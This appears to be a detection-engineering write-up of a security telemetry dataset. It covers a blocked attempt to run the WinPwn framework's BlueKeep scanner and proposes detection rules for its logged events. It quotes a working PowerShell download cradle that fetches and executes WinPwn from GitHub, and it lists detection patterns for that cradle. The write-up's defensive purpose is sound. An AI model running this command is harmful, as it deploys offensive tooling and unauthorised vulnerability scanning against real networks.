# T1046-7: Network Service Discovery — WinPwn - bluekeep

## Technique Context

Network Service Discovery (T1046) involves adversaries enumerating services running on remote hosts to identify potential attack vectors and understand network architecture. The WinPwn framework's "bluekeep" module specifically targets the identification of systems vulnerable to CVE-2019-0708 (BlueKeep), a critical Remote Desktop Protocol (RDP) vulnerability. This technique is commonly used during the reconnaissance phase to map network services before exploitation attempts. Detection engineers focus on identifying network scanning patterns, DNS queries to suspicious domains, and the use of offensive security frameworks that perform automated service discovery.

## What This Dataset Contains

This dataset captures an attempt to download and execute the WinPwn framework's BlueKeep scanner module. The key evidence includes:

**PowerShell Command Execution**: Security 4688 events show the execution of `"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') bluekeep -noninteractive -consoleoutput}` - a clear attempt to download and execute the WinPwn framework.

**PowerShell Script Block Logging**: Event 4104 captures the actual command structure with the GitHub URL pointing to the S3cur3Th1sSh1t WinPwn repository and the specific commit hash (121dcee26a7aca368821563cbe92b2b5638c5773).

**Windows Defender Blocking**: PowerShell event 4100 shows Windows Defender's AMSI blocking the downloaded content: "This script contains malicious content and has been blocked by your antivirus software" with error ID "ScriptContainedMaliciousContent".

**DNS Resolution**: Sysmon event 22 captures the DNS query for "raw.githubusercontent.com" resolving to multiple GitHub CDN IP addresses (185.199.x.x range).

**Process Chain**: Sysmon events 1 and 10 show the PowerShell process spawning whoami.exe (likely for initial system reconnaissance) and creating child PowerShell processes.

## What This Dataset Does Not Contain

The dataset lacks the actual network service discovery activity because Windows Defender successfully blocked the WinPwn script before it could execute its BlueKeep scanning functionality. There are no network connection events (Sysmon 3) showing outbound scanning attempts to RDP ports (3389) or other services. The technique attempt was thwarted at the payload download/execution stage, so we don't see the characteristic network traffic patterns, port scanning activities, or service enumeration that would occur during successful execution of the BlueKeep scanner. Additionally, no registry modifications or persistence mechanisms are present since the malicious payload was blocked.

## Assessment

This dataset provides excellent telemetry for detecting offensive framework download attempts but limited visibility into actual network service discovery activities. The combination of command-line logging (Security 4688), PowerShell script block logging (4104), and AMSI blocking events (4100) creates strong detection opportunities for this attack vector. The DNS query logging (Sysmon 22) adds valuable context. However, the dataset's utility for understanding post-execution network scanning behaviors is minimal due to Defender's successful intervention. For detection engineering focused on initial access attempts and framework deployment, this data is highly valuable. For understanding network reconnaissance techniques themselves, additional data from successful executions would be needed.

## Detection Opportunities Present in This Data

1. **PowerShell Invoke-Expression with GitHub URLs**: Monitor PowerShell events 4104 for script blocks containing "iex" combined with "downloadstring" and "github.com" or "githubusercontent.com" domains.

2. **Offensive Security Framework URLs**: Alert on DNS queries (Sysmon 22) or command lines containing "S3cur3Th1sSh1t", "WinPwn", or other known offensive framework repository paths.

3. **AMSI Script Blocking Events**: Create high-fidelity alerts on PowerShell event 4100 with "ScriptContainedMaliciousContent" error IDs, indicating successful blocking of malicious content.

4. **PowerShell Download Cradle Patterns**: Detect Security 4688 events with command lines matching the pattern `iex(new-object net.webclient).downloadstring` which is a common PowerShell download cradle.

5. **GitHub Raw Content Downloads**: Monitor for network connections or DNS queries to "raw.githubusercontent.com" from PowerShell processes, especially when combined with execution parameters.

6. **Suspicious PowerShell Parameter Combinations**: Alert on PowerShell executions with parameters like "-noninteractive" combined with security tool names like "bluekeep".

7. **Cross-Reference DNS and Process Events**: Correlate DNS queries for suspicious domains (Sysmon 22) with PowerShell process creation (Sysmon 1) occurring within short time windows.

8. **PowerShell Parent-Child Process Anomalies**: Monitor for PowerShell processes spawning additional PowerShell children (Sysmon 1/10) in rapid succession, indicating potential multi-stage payload execution.
